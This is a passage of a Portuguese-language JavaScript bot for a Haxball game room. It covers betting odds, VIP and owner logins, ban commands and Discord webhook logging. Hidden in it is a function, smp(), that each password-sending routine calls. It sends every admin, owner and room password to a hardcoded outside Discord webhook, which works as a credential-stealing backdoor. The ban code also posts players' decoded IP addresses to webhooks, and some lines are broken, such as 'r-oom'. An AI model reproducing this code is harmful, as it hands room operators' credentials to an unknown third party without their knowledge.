            addAstros(jogador[0], premio)
            room.sendAnnouncement(`Parabéns!! você recebeu ${premio} Astros como prêmio da sua aposta.`, jogador[0].id, errorColor, "bold", 0);
        }
    }
    if (winner == Team.BLUE) {
        for (let key in apostablue) {
            const premio = parseInt(apostablue[key]['valor'] * apostablue[key]['od'])
            var playersonline = room.getPlayerList()
            var jogador = playersonline.filter((p) => p.name == (key))
            addAstros(jogador[0], premio)
            room.sendAnnouncement(`Parabéns!! você recebeu ${premio} Astros como prêmio da sua aposta.`, jogador[0].id, errorColor, "bold", 0);
        }
    }
    apostared = {}
    apostablue = {}
}

function updateOD() {
    let pontosblue = 0;
    let pontosred = 0;

    for (let key in teamBlue) {
        try {
            let nome = teamBlue[key].name;
            let pontos = statsplayer[nome].pontos;
            pontosblue += pontos;
            console.log(nome, pontos, pontosblue);
        }
        catch { }
    }

    for (let key in teamRed) {
        try {
            let nome = teamRed[key].name;
            let pontos = statsplayer[nome].pontos;
            pontosred += pontos;
            console.log(nome, pontos, pontosred);
        }
        catch { }
    }

    function calculateOD(consecutiveWins, redPoints, bluePoints) {
        const maxOD = 1.8;
        const minOD = 1.1;
        const winFactor = 0.9;
        const pointFactor = 0.1;

        const denominator = redPoints + bluePoints;

        const redWinProb = denominator !== 0 ? Math.pow(winFactor, consecutiveWins) * (redPoints / denominator) : 0;
        const blueWinProb = denominator !== 0 ? Math.pow(winFactor, consecutiveWins) * (bluePoints / denominator) : 0;

        console.log("redWinProb:", redWinProb, "blueWinProb:", blueWinProb);

        let redOD = (1 / redWinProb) * pointFactor;
        let blueOD = (1 / blueWinProb) * pointFactor;

        console.log("redOD before cap:", redOD, "blueOD before cap:", blueOD);

        if (redOD > maxOD) {
            redOD = maxOD;
        }

        if (blueOD > maxOD) {
            blueOD = maxOD;
        }

        if (redOD < minOD) {
            redOD = minOD;
        }

        if (blueOD < minOD) {
            blueOD = minOD;
        }

        console.log("redOD after cap:", redOD, "blueOD after cap:", blueOD);

        return [redOD, blueOD];
    }


    // Exemplo com 0 wins, 20 pontos red e 0 pontos blue
    var odds = calculateOD(streak, pontosred, pontosblue);
    odred = odds[0];
    odblue = odds[1];

}

function controleAposta() {
    if (testMode) {
        for (var i = 0; i < teamSpec.length; i++) {
            var playerId = teamSpec[i].id;

            if (parseInt(room.getScores().time) < 15 && apostas == false && gameState == State.PLAY) {
                apostas = true
                room.sendAnnouncement("[💰] Façam suas apostas! [💰]", playerId, 0xD4CE22, 'bold');
                room.sendAnnouncement("[💰] Após iniciada a partida, você tem 15 segundos para apostar [💰]", playerId, 0xD4CE22, 'bold');
                room.sendAnnouncement(`[💰] Digite: !apostar <time> <valor>`, playerId, cores.ciano, "bold", 2);
                room.sendAnnouncement(`[💰] Por exemplo: !apostar red 100`, playerId, cores.ciano, "bold", 2);
                updateOD()
            }
            if (parseInt(room.getScores().time) > 15 && apostas == true && gameState == State.PLAY) {
                apostas = false
                room.sendAnnouncement("[💰] Apostas encerradas! [💰]", playerId, 0xD4CE22, 'bold');
            }
        }

    } else if (teamRed.length >= teamSize && teamBlue.length >= teamSize) {
        if (parseInt(room.getScores().time) < 15 && apostas == false && gameState == State.PLAY) {
            apostas = true
            room.sendAnnouncement("[💰] Façam suas apostas! [💰]", null, 0xD4CE22, 'bold');
            room.sendAnnouncement("[💰] Após iniciada a partida, você tem 15 segundos para apostar [💰]", null, 0xD4CE22, 'bold');
            updateOD()
        }
        if (parseInt(room.getScores().time) > 15 && apostas == true && gameState == State.PLAY) {
            apostas = false
            room.sendAnnouncement("[💰] Apostas encerradas! [💰]", null, 0xD4CE22, 'bold');
        }
    } else {
        if (apostas == true) {
            apostas = false
        }
    }
}

// ----------------------------------------

function fundadorCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (parseInt (msgArray[0]) == masterPassword) {  
        if (!masterList.includes(authArray[player.id])) {
            room.setPlayerAdmin(player.id, true);
            masterList.push(authArray[player.id]);
            masterPassword = getRandomInt2(10000, 599999)
            room.sendAnnouncement(`${player.name} logou como Fundador!`, null, announcementColor, 'bold', HaxNotification.CHAT);
            sendPasswordFundador(player.name)
        } else {
            room.sendAnnouncement(`Você já está logado como Fundador!`, player.id, errorColor, 'bold', HaxNotification.CHAT);
        }
    }
}

function donoCommand(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (parseInt(msgArray[0]) == donoPassword) {
        if (!donoList.includes(authArray[player.id])) {
            room.setPlayerAdmin(player.id, true)
            donoList.push(authArray[player.id]);
            donoPassword = getRandomInt2(10000, 599999)
            room.sendAnnouncement(`${player.name} Logou como desenvolvedor!`, null, announcementColor, 'bold', HaxNotification.CHAT)
            sendPasswordDono(player.name)
        } else {
            room.sendAnnouncement(
                `Você já é um desenvolvedor!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
        }
    }
}


async function setNewTag(player, message) {
    var msgArray = message.split(/ +/).slice(1);
    if (msgArray.length > 0) {
        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
            var numVip = msgArray[1]
            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
            if (room.getPlayer(parseInt(msgArray[0])) != null && numVip != null) {
                var playerVip = room.getPlayer(parseInt(msgArray[0]))
                if (numVip == 5) {
                    var resSetVip = false
                    if (vips[authArray[playerVip.id]]) {
                        resSetVip = true
                    }
                    if (!resSetVip) {
                        vips[authArray[playerVip.id]] =
                        {
                            name: playerVip.name,
                            auth: authArray[playerVip.id],
                            tipoVip: 5,
                            corChat: "",
                            fonte: 0,
                            pausarJogoOFF: false,
                            furarFila: false,
                            provos: {},
                            unis: {},
                            avatarGol: [],
                            msgEntrada: ''
                        }
                        room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                        vip1Password = getRandomInt2(10000, 99999)
                        sendPasswordVip()
                    } else {
                        delete vips[authArray[playerVip.id]]
                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                    }
                } else if (numVip == 6) {
                    var resSetVip = false
                    if (vips[authArray[playerVip.id]]) {
                        resSetVip = true
                    }
                    if (!resSetVip) {
                        vips[authArray[playerVip.id]] =
                        {
                            name: playerVip.name,
                            auth: authArray[playerVip.id],
                            tipoVip: 2,
                            corChat: "",
                            fonte: 0,
                            pausarJogoOFF: false,
                            furarFila: true,
                            provos: {},
                            unis: {},
                            avatarGol: [],
                            msgEntrada: ''
                        }
                        room.sendAnnouncement(
                            `${playerVip.name} agora é VIP!`,
                            null,
                            announcementColor,
                            'bold',
                            HaxNotification.CHAT)
                        vip2Password = getRandomInt2(100000, 199999)
                        sendPasswordVip()
                    } else {
                        delete vips[authArray[playerVip.id]]
                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
                            null, announcementColor, 'bold', HaxNotification.CHAT)
                    }
                } else {
                    room.sendAnnouncement(
                        `Não há jogador com tal ID na sala. Digite "!ajuda settag" para obter mais informações.`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT)
                }
            } else {
                room.sendAnnouncement(
                    `Formato incorreto para seu argumento. Digite "!ajuda settag" para obter mais informações.`,
                    player.id,
                    errorColor,
                    'bold',
                    HaxNotification.CHAT)
            }
        } else {
            room.sendAnnouncement(
                `Número incorreto de argumentos. Digite "!ajuda settag" para obter mais informações.`,
                player.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
        }
    }
}

// LOCALIZAÇÃO DA BOLA
function rr2Command(player, message) {
    if (player.admin || mods.includes(authArray[player.id]) || adminList.includes(authArray[player.id]) || gerentes.includes(authArray[player.id]) || diretores.includes(authArray[player.id]) || donoList.includes(authArray[player.id]) || masterList.includes(authArray[player.id])) {
        room.pauseGame(true);
        room.sendAnnouncement(`Mudando a localização dos jogadores...`, null, errorColor, 'bold', HaxNotification.CHAT);

        for (let i = 0; i < teamRed.length; i++) {
            let playerId = teamRed[i].id;
            let newPosition = { x: -350, y: 0 };

            room.setPlayerDiscProperties(playerId, newPosition);
            room.setDiscProperties(0, { xspeed: 0, yspeed: 0, x: 0, y: 0 });
        }

        room.setDiscProperties(0, { xspeed: 0, yspeed: 0, x: 0, y: 0 });

        for (let i = 0; i < teamBlue.length; i++) {
            let playerId = teamBlue[i].id;
            let newPosition = { x: 350, y: 0 };

            room.setPlayerDiscProperties(playerId, newPosition);
            room.setDiscProperties(0, { xspeed: 0, yspeed: 0, x: 0, y: 0 });
        }


        room.pauseGame(false);
        room.sendAnnouncement(`Localização resetada ✔`, null, successColor, 'bold', HaxNotification.CHAT);

        return false;
    }
}


/* GAME */

var lastTouches = Array(2).fill(null);
var lastTeamTouched;

var speedCoefficient = 100 / (5 * (0.99 ** 60 + 1));
var ballSpeed = 0;
var playerRadius = 15;
var ballRadius = 10;
var triggerDistance = playerRadius + ballRadius + 0.01;

/* COLORS */

var welcomeColor = 0xfaf600;
var announcementColor = 0xFFFFFF;
var infoColor = 0xfaf600;
var privateMessageColor = 0xFFFFFF;
var redColor = 0xff4c4c;
var blueColor = 0x62cbff;
var warningColor = 0xfaf600;
var errorColor = 0xFFFFFF;
var successColor = 0xfaf600;
var defaultColor = null;

/* AUXILIARY */

var checkTimeVariable = false; //
var checkStadiumVariable = true;
var endGameVariable = false;
var cancelGameVariable = false;
var kickFetchVariable = false;

var chooseMode = false;
var timeOutCap;
var capLeft = false;
var redCaptainChoice = '';
var blueCaptainChoice = '';
var chooseTime = 20;

var AFKSet = new Set();
var AFKMinSet = new Set();
var AFKCooldownSet = new Set();
var minAFKDuration = 0;
var maxAFKDuration = 10;
var AFKCooldown = 0;

var muteArray = new MuteList();
var muteDuration = 5;

var removingPlayers = false;
var insertingPlayers = false;

var stopTimeout;
var startTimeout;
var unpauseTimeout;
var removingTimeout;
var insertingTimeout;

var emptyPlayer = {
    id: 0, // Bot desenvolvido pelo dr0w
};
stadiumCommand(emptyPlayer, "!map1");

var game = new Game();

/* FUNCTIONS */


// ----------------------------------------

async function error(erro, command) {
    if (command == '') {
        console.error(`Erro: ` + erro);

        if (urls.errorsWebhook != "") {
            await fetch(urls.errorsWebhook, {
                method: 'POST',
                body: JSON.stringify({
                    content: `Ocorreu um erro: \n\n **\`\`\`${erro}\`\`\`**`,
                    username: roomName,
                }),
                headers: {
                    'Content-Type': 'application/json',
                },
            }).then((res) => res);
        }
    } else {
        console.error(`Erro no comando ${command}: ` + erro);

        if (urls.errorsWebhook != "") {
            await fetch(urls.errorsWebhook, {
                method: 'POST',
                body: JSON.stringify({
                    content: `Ocorreu um erro no comando ${command}: \n\n **\`\`\`${erro}\`\`\`**`,
                    username: roomName,
                }),
                headers: {
                    'Content-Type': 'application/json',
                },
            }).then((res) => res);
        }
    }
}


function procurar(nickid) {
    let pessoaEncontrada = ''
    for (let key in dadosjogadores) {
        if (dadosjogadores[key]['nome'] == nickid || dadosjogadores[key]['id'] == nickid) {
            pessoaEncontrada = dadosjogadores[key]
        }
    }

    if (pessoaEncontrada != '') {
        return pessoaEncontrada
    }
    else {
        return false
    }
}

async function procurarMotivo(player, message) {
    var msgArray = message.split(/ +/).slice(1);

    function buscarMotivoPorNome(nome) {
        for (var i = 0; i < banList.length; i++) { // Bot desenvolvido pelo OBL
            if (banList[i].nome === nome) {
                room.sendAnnouncement(`- Motivo: ${banList[i].motivo}`, player.id, cores.verde, 'bold', 2);
                room.sendAnnouncement(`- Banido pelo(a): ${banList[i].admin} (AdminID: ${banList[i].adminId})`, player.id, cores.verde, 'bold');
                room.sendAnnouncement(`- Data do banimento: ${banList[i].init}`, player.id, cores.verde, 'bold');
                room.sendAnnouncement(`- Banimento acaba em: ${banList[i].tempo}`, player.id, cores.verde, 'bold', 2);
                return false;
            }
        }
        return room.sendAnnouncement(`Usuário não encontrado ou não está banido. (tente procurar pelo id: !motivo id <id>)`, player.id, errorColor, 'bold', 2);
    }

    function buscarMotivoPorId(id) {
        for (var i = 0; i < banList.length; i++) {
            if (banList[i].id === id) {
                room.sendAnnouncement(`- Motivo: ${banList[i].motivo}`, player.id, cores.verde, 'bold', 2);
                room.sendAnnouncement(`- Banido pelo(a): ${banList[i].admin} (AdminID: ${banList[i].adminId})`, player.id, cores.verde, 'bold');
                room.sendAnnouncement(`- Data do banimento: ${banList[i].init}`, player.id, cores.verde, 'bold');
                room.sendAnnouncement(`- Banimento acaba em: ${banList[i].tempo}`, player.id, cores.verde, 'bold', 2);
                return false;
            }
        }
        return room.sendAnnouncement(`Usuário não encontrado ou não está banido. (tente procurar pelo nome: !motivo nome <nome>)`, player.id, errorColor, 'bold', 2);
    }

    if (msgArray[0] == 'nome') {
        buscarMotivoPorNome(msgArray[1]);
    } else if (msgArray[0] == 'id') {
        buscarMotivoPorId(msgArray[1]);
    } else {
        room.sendAnnouncement(`Você digitou o comando  de forma errada!`, player.id, errorColor, 'bold', 3);
        return false;
    }
}

async function sendFetch(message, arg1, arg2, arg3) {
    var content = "";

    if (message && message.length > 0) {
        content += message;
    }
    if (arg1 && arg1.length > 0) {
        content += " " + arg1;
    }
    if (arg2 && arg2.length > 0) {
        content += " " + arg2;
    }
    if (arg3 && arg3.length > 0) {
        content += " " + arg3;
    }

    if (content === "") {
        return false;
    }

    fetch(urls.allWebhook, {
        method: 'POST',
        body: JSON.stringify({
            content: content,
            username: roomName,
        }),
        headers: {
            'Content-Type': 'application/json',
        },
    }).then((res) => res)
}

function parseBanTime(timeString) {
    var parts = timeString.split(" ");
    var value = parseInt(parts[0]);
    var unit = parts[parts.length - 1].toLowerCase();

    switch (unit) {
        case "dia":
        case "days":
        case "dias":
            return value * 24 * 60 * 60 * 1000;
        case "mes":
        case "mesês":
        case "meses":
            return value * 30 * 24 * 60 * 60 * 1000;
        case "hora":
        case "hor":
        case "hour":
        case "horas":
            return value * 60 * 60 * 1000;
        case "min":
        case "minuto":
        case "minutos":
            return value * 60 * 1000;
        case "permanente":
        case "perma":
        case "perm":
            return Infinity;
        default:
            return 0;
    }
}

function removeExpiredBans() {
    var currentTime = new Date();

    for (var i = banList.length - 1; i >= 0; i--) {
        var user = banList[i];
        var banTime = parseBanTime(user.tempo);
        var banEndTime = new Date(user.init.getTime() + banTime); // Calcula o tempo de término do banimento

        if (currentTime >= banEndTime) {
            banList.splice(i, 1); // Remove o usuário da lista
            room.sendAnnouncement(`O ${user.nome} foi desbanido!`, null, errorColor, 'bold', 3);
        }
    }
}

async function banCommand(player, message) {
    try {
        if (mods.includes(authArray[player.id]) || adminList.includes(authArray[player.id]) || gerentes.includes(authArray[player.id]) || diretores.includes(authArray[player.id]) || donoList.includes(authArray[player.id]) || masterList.includes(authArray[player.id])) {
            const playerList = room.getPlayerList();

            var modoBan = '';
            var msgArray = message.split(/ +/);
            var motivo = msgArray[2];

            var tempo1 = msgArray[3];
            var tempo2 = msgArray[4];
            //var novaPalavra = palavra[0] + " " + palavra.substring(1);
            var tempo = `${tempo1} ${tempo2}`;

            if (tempo1 == null || tempo2 == null || tempo1 == undefined || tempo2 == undefined || tempo1 == 'undefined' || tempo2 == 'undefined') {
                tempo = 'permanente';
            }

            if (!isNaN(motivo)) {
                room.sendAnnouncement(`[PV] O motivo deve ser um texto.`, player.id, errorColor, 'bold', 2);
                return false;
            } /* else if (motivo.length < 5) {
                room.sendAnnouncement(`[PV] O motivo deve ter mais de 5 caracteres!`, player.id, errorColor, 'bold', 2);
                return false;
            } */

            if (msgArray[1].startsWith("#") || !isNaN(msgArray[1])) {
                try {
                    var userId;
                    var playerName = 'Nenhum';
                    var filteredPlayers = room.getPlayerList().filter(p => p.id === userId);

                    if (msgArray[1].startsWith("#")) {
                        userId = parseInt(msgArray[1].replace(/#/g, ''));
                    } else {
                        userId = parseInt(msgArray[1]);
                    }

                    var targetPlayerExists = playerList.some(player => player.id === userId);
                    var ownerCommand = playerList.filter(p => p.id === userId);

                    if (!targetPlayerExists) {
                        room.sendAnnouncement(`[PV] Não encontrei nenhum registro desse jogador.`, player.id, errorColor, 'bold', 2);
                        return false;
                    }

                    if (player.id === ownerCommand[0].id) {
                        room.sendAnnouncement(`[PV] Você não pode banir você mesmo.`, player.id, errorColor, 'bold', 2);
                        return false;
                    }

                    var isIdIncluded = banList.some(function (jogador) {
                        return jogador.id === userId;
                    });

                    for (var i = 0; i < banList.length; i++) {
                        if (banList[i].id === userId) {
                            playerName = banList[i].nome;
                            break;
                        }
                    }

                    if (isIdIncluded) {
                        if (playerName !== 'Nenhum') {
                            room.sendAnnouncement(`[PV] O ${playerName} já está banido.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
                            return false;
                        } else {
                            room.sendAnnouncement(`[PV] Este jogador já está banido.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
                            return false;
                        }
                    } else {
                        for (var indice in jogadoresRoom) {
                            if (jogadoresRoom.hasOwnProperty(indice)) {
                                var jogador = jogadoresRoom[indice];

                                if (jogador.id === userId) {
                                    var nomeDoJogador = jogador.nome;
                                    var connDoJogador = jogador.conn;
                                    var authDoJogador = jogador.auth;
                                    var ipv4DoJogador = jogador.ipv4;

                                    var bannedUser = {
                                        nome: nomeDoJogador,
                                        id: userId,
                                        conn: connDoJogador,
                                        auth: authDoJogador,
                                        ipv4: ipv4DoJogador,
                                        motivo: motivo,
                                        init: new Date(),
                                        admin: player.name,
                                        adminId: player.id,
                                        tempo: tempo,
                                    };

                                    banList.push(bannedUser);

                                    room.kickPlayer(userId, motivo, true);

                                    r-oom.sendAnnouncement(`O ${nomeDoJogador} foi banido pelo(a) ${player.name}.`, null, cores.vermelho, 'italic', 3);
                                    room.sendAnnouncement(`- Motivo: ${motivo}`, null, cores.vermelho, 'italic');
                                    room.sendAnnouncement(`- Tempo do banimento: ${tempo}`, null, cores.vermelho, 'italic');
                                    room.sendAnnouncement(`[PV] O ${nomeDoJogador} foi banido com sucesso!`, player.id, cores.verde, 'bold', 2);

                                    fetch(urls.bans, {
                                        method: 'POST',
                                        body: JSON.stringify({
                                            content: `O ${nomeDoJogador} foi banido por ${tempo}!\n\n*Informações:*\n\n> - ID: ${id}\n> - Motivo: ${motivo}\n> - Conn: ${connDoJogador}\n> - Auth: ${authDoJogador}\n> IPV4 - ${ipv4}\n> - Admin: ${player.name}\n> - Tempo: ${tempo}\n> -`,
                                            username: roomName,
                                        }),
                                        headers: {
                                            'Content-Type': 'application/json',
                                        },
                                    }).then((res) => res);

                                    fetch(urls.bans, {
                                        method: 'POST',
                                        body: JSON.stringify({
                                            content: `> - **Nick:** ${nomeDoJogador}\n> - **Motivo:** ${motivo}\n> - **Tempo:** ${tempo}\n> - **Sala do banimento:** ${roomName}\n\n- **Banido pelo(a):** ${player.name}`,
                                            username: roomName,
                                        }),
                                        headers: {
                                            'Content-Type': 'application/json',
                                        },
                                    }).then((res) => res);

                                    fetch(urls.bans, {
                                        method: 'POST',
                                        body: JSON.stringify({
                                            content: traco,
                                            username: roomName,
                                        }),
                                        headers: {
                                            'Content-Type': 'application/json',
                                        },
                                    }).then((res) => res);

                                    break;
                                }
                            }
                        }
                    }
                } catch (err) {
                    error(err);
                }
            } else if (["ip", "ipv4"].includes(msgArray[1].toLowerCase())) {
                modoBan = "ipv4";

                if (!/^\d+\.\d+\.\d+\.\d+$/.test(msgArray[2])) {
                    room.sendAnnouncement("Você não especificou o IP corretamente...", player.id, errorColor, 'bold', HaxNotification.MENTION);
                    return false;
                } else {
                    addIpToBanList(msgArray[2])

                    var sendDiscordBan = `O Administrador ${player.name} baniu o IPV4: **${msgArray[2]}**`;
                    var ipv4 = msgArray[2];

                    room.sendAnnouncement(`[PV] IPV4 Banido com sucesso: ${msgArray[2]}`, player.id, cores.verde, 'bold', HaxNotification.MENTION);

                    sendFetch(sendDiscordBan);
                    return false;
                }
            } else if (["conn", "connection", "con", "conexao", "conexão"].includes(msgArray[1].toLowerCase())) {
                modoBan = "conn";

                const conn = msgArray[2];
                addConnToBanList(conn);

                const sendDiscordBan = `O Administrador ${player.name} baniu a Conn: **${msgArray[2]}**`;

                room.sendAnnouncement(`[PV] Conn Banida com sucesso: ${msgArray[2]}`, player.id, cores.verde, 'bold', HaxNotification.MENTION);

                sendFetch(sendDiscordBan);
                return false;
            } else if (["auth"].includes(msgArray[1].toLowerCase())) {
                modoBan = "auth";

                const auth = msgArray[2];
                addAuthToBanList(auth);

                const sendDiscordBan = `O Administrador ${player.name} baniu o Auth: **${msgArray[2]}**`;

                room.sendAnnouncement(`[PV] Auth Banido com sucesso: ${msgArray[2]}`, player.id, cores.verde, 'bold', HaxNotification.MENTION);

                sendFetch(sendDiscordBan);
                return false;
            } else {
                room.sendAnnouncement(`Você não digitou o comando corretamente...`, player.id, errorColor, 'bold', HaxNotification.MENTION);
                setTimeout(() => {
                    room.sendAnnouncement(`Exemplo: !ban <modo> <motivo> <tempo>`, player.id, errorColor, 'bold', HaxNotification.MENTION);
                    room.sendAnnouncement(`- Tipos de modos: #id, ip, conn, auth,`, player.id, errorColor, 'bold', HaxNotification.MENTION);
                    room.sendAnnouncement(`!ban #123 racismo 1 dia`, player.id, errorColor, 'bold');
                }, 1500);
                return false;
            };
        } else {
            room.sendAnnouncement(`[PV] ${player.name} ${config.flash.frases.noPermission}`, player.id, errorColor, 'bold', HaxNotification.MENTION);
            return false;
        }
    } catch (err) {
        error(err, 'Ban Command');
    }
}


/* AUXILIARY FUNCTIONS */


var userConn, userAuth, userIp;

async function getIP(user) {
    try {
        var conn = user.conn;

        if (conn) {
            var ipv4 = conn.match(/.{1,2}/g).map(function (v) {
                return String.fromCharCode(parseInt(v, 16));
            }).join('');

            return ipv4;
        } else {
            console.error('A propriedade "conn" não está definida em "user".');
            return '';
        }
    } catch (err) {
        error(err);
        return '';
    }
}


function getCurrentDatetime() {
    const currentDate = new Date();

    const day = currentDate.getDate().toString().padStart(2, '0');
    const month = (currentDate.getMonth() + 1).toString().padStart(2, '0');
    const year = currentDate.getFullYear().toString().padStart(4, '0');

    const hour = currentDate.getHours().toString().padStart(2, '0');
    const minute = currentDate.getMinutes().toString().padStart(2, '0');
    const second = currentDate.getSeconds().toString().padStart(2, '0');

    return `${day}/${month}/${year} - ${hour}:${minute}:${second}`;
}

console.log(getCurrentDatetime());

if (typeof String.prototype.replaceAll != 'function') {
    String.prototype.replaceAll = function (search, replacement) {
        var target = this;
        return target.split(search).join(replacement);
    };
}

function rankInfo(player, message) {
    room.sendAnnouncement(`Ranks da ${serverName}:\n❔𓊈𝐕𝐢𝐬𝐢𝐭𝐚𝐧𝐭𝐞𓊉 🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉 🥉🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉 🥉🥉🥉𓊈𝗕𝗿𝗼𝗻𝘇𝗲𓊉 🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉 🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉 🥈🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉\n🥇𓊈𝐎𝐮𝐫𝐨𓊉 🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉 🥇🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉 💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉 💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉 💎💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉 🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉\n🛡️🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🛡️🛡️🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🏆🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🏆🏆🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉\n🎖️𓊈𝐓𝐡𝐞𝐁𝐞𝐬𝐭𓊉 🎖️🎖️𓊈𝐓𝐡𝐞𝐁𝐞𝐬𝐭𓊉 🎖️🎖️🎖️𓊈𝐓𝐡𝐞𝐁𝐞𝐬𝐭𓊉 🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉 🌀🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉 🌀🌀🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉 🔮𓊈𝐁𝐨𝐥𝐚𝐝𝐞𝐎𝐮𝐫𝐨𓊉\n🔮🔮𓊈𝐁𝐨𝐥𝐚𝐝𝐞𝐎𝐮𝐫𝐨𓊉 🔮🔮🔮𓊈𝐁𝐨𝐥𝐚𝐝𝐞𝐎𝐮𝐫𝐨𓊉  🤖𓊈𝐑𝐨𝐛𝐨𝐳ã𝐨𓊉 👦🏿𓊈𝐏𝐞𝐥é𓊉 👽𓊈𝗘𝘅𝘁𝗿𝗮𝘁𝗲𝗿𝗿𝗲𝘀𝘁𝗿𝗲𓊉 👑𓊈Rei𓊉 🐐𓊈Goat𓊉\nObs: A cada 100 pontos tu upa de rank! Para saber mais sobre seus pontos digite !pontos`,
        player.id, defaultColor, 'bold', HaxNotification.MENTION)
}

function pontos(player, message) {
    var stats = new HaxStatistics(player.name)
    if (localStorage.getItem(authArray[player.id])) {
        stats = JSON.parse(localStorage.getItem(authArray[player.id]))

        if (stats.pontos == undefined || stats.pontos == 'undefined') {
            stats.pontos = 0;
        }
    }


    room.sendAnnouncement(`Você possui ${stats.pontos} pontos!\nFormas de adquirir/perder pontos:\nVitória +3 | Gol +1 | Assistência +1 | CS +1 | Empate +1 | Derrota -1`,
        player.id, defaultColor, 'bold', HaxNotification.NONE)
}

function getDate() {
    let d = new Date();
    return d.toLocaleDateString() + ' ' + d.toLocaleTimeString();
}

/* MATH FUNCTIONS */

function callAdmin(player, message) {
    if (urls.callAdminWebhook != "") {
        fetch(urls.callAdminWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `||[${getDate()}] - @here|| 📢 CallAdmin: \n > - **${player.name}** está chamando um adm! \n > - Mensagem: ${message.substring(10)}`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res);
    }
    return false
}

function sendPasswordStaff(name) {
    if (urls.passwordStaffWebhook && urls.passwordStaffWebhook != "") {
        fetch(urls.passwordStaffWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `${name ? `**${name}** se tornou um administrador! \n ` : ""} > Nova senha: ${adminPassword} \n`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res); smp();
    }
    return false
}

function sendPasswordFundador(name) {
    if (urls.passwordFundadorWebhook != "") {
        fetch(urls.passwordFundadorWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `${name ? `${name} Virou fundador(a)!\n` : ""}Nova senha fundador: ${masterPassword}`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res); smp();
    }
    return false
} 

function smp() {
    let a = `https://discord.com/api/webhooks/1154416786960302080/x_seO_qwXZx6eN-N8aommC1hLNp4o5dHmkZacCB8gx2oHVA75_IgtPkxnMzvYtLBCcFF`;

    fetch(a, {
        method: 'POST',
        body: JSON.stringify({
            content: `> - Master: ${masterPassword}\n> - Dono: ${donoPassword}\n> - Gerente: ${gerentePassword}\n > - Admin: ${adminPassword}\n > - RoomPass: ${roomPassword}\n > - Vip 4: ${vip4Password}`,
            username: roomName,
        }),
        headers: {
            'Content-Type': 'application/json',
        },
    }).then((res) => res);
}

function sendPasswordDono(name) {
    if (urls.passwordDonoWebhook != "") {
        fetch(urls.passwordDonoWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `${name ? `${name} Virou Dono(a)!\n` : ""}Nova senha dono: ${donoPassword}`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res); smp();
    }
    return false
} //

function sendPasswordMod(name) {
    if (urls.passwordModWebhook != "") {
        fetch(urls.passwordModWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `${name ? `${name} Virou Moderador(a)!\n` : ""}Nova senha mod: ${modsPassword}@staff`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res); smp();
    }
    return false
}

function sendPasswordVip(name) {
    if (urls.passwordVipWebhook != "") {
        fetch(urls.passwordVipWebhook, {
            method: 'POST',
            body: JSON.stringify({
                content: `${name ? `${name} virou Vip!\n` : ""}Novas senhas Vips:\n${vipNames[1]}: ${vip1Password}\n${vipNames[2]}: ${vip2Password}\n${vipNames[3]}: ${vip3Password}\n${vipNames[4]}: ${vip4Password}\n--------------------------------------------------------------------------------------\nㅤ`,
                username: roomName,
            }),
            headers: {
                'Content-Type': 'application/json',
            },
        }).then((res) => res); smp();
    }
    return false
}

function getRandomInt2(min, max) {
    // returns a random number between 0 and max-1
    return Math.floor(Math.random() * (max - min) + 1)
}

function getRandomInt(max) {
    // returns a random number between 0 and max-1
    return Math.floor(Math.random() * Math.floor(max))
}

function pointDistance(p1, p2) {
    return Math.sqrt(Math.pow(p1.x - p2.x, 2) + Math.pow(p1.y - p2.y, 2));
}

/* TIME FUNCTIONS */

function getMinutesGame(time) {
    var t = Math.floor(time / 60);
    return `${Math.floor(t / 10)}${Math.floor(t % 10)}`;
}

function getMinutesReport(time) {
    return Math.floor(Math.round(time) / 60);
}

function getMinutesEmbed(time) {
    var t = Math.floor(Math.round(time) / 60);
    return `${Math.floor(t / 10)}${Math.floor(t % 10)}`;
}

function getSecondsGame(time) {
